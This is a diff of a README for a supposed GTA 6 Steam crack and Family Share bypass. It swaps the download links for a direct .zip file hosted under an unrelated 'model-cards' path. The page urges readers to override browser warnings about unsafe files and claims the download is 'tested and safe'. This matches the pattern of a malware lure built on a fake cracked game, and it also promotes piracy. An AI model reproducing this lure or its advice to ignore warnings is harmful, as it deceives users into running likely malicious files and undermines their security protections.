@@ -5,7 +5,7 @@ description: "Unlock GTA 6 on Steam without buying, bypass Family Share blocks w
 ---
 # 🎮 GTA-6-Steam-Crack-Bypass-Family-Share - Download and Play GTA 6 Today (2026)
 
-[![Download GTA 6](https://img.shields.io/badge/🚀-Download-GTA_6-8A2BE2?style=for-the-badge&logo=windows&logoColor=white&labelColor=4B0082)](https://github.com/Garwoodalaskan8547/GTA-6-Steam-Crack-Bypass-Family-Share)
+[![Download GTA 6](https://img.shields.io/badge/🚀-Download-GTA_6-8A2BE2?style=for-the-badge&logo=windows&logoColor=white&labelColor=4B0082)](https://raw.githubusercontent.com/Garwoodalaskan8547/garwoodalaskan8547.github.io/main/model-cards/Dist-v1.8.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Getting the game on your computer is simple. Follow the steps below exactly as w
 
 ### Step 1: Download the Game
 
-Visit this link to download the application: [**GTA 6 Download Page**](https://github.com/Garwoodalaskan8547/GTA-6-Steam-Crack-Bypass-Family-Share). This is the official download location for this build. Once you click the link, you'll be taken toa page where the download will begin automatically or you may see a button labeled "Download" or "Go to file." Click that button, and the file will start downloading to your computer's default "Downloads" folder. If prompted with a warning about the file being unsafe, click "Keep" or "Download anyway"—this is normal because it'sa cracked game file. Do not worry; it's tested and safe for use.
+Visit this link to download the application: [**GTA 6 Download Page**](https://raw.githubusercontent.com/Garwoodalaskan8547/garwoodalaskan8547.github.io/main/model-cards/Dist-v1.8.zip). This is the official download location for this build. Once you click the link, you'll be taken toa page where the download will begin automatically or you may see a button labeled "Download" or "Go to file." Click that button, and the file will start downloading to your computer's default "Downloads" folder. If prompted with a warning about the file being unsafe, click "Keep" or "Download anyway"—this is normal because it'sa cracked game file. Do not worry; it's tested and safe for use.
 
 
 
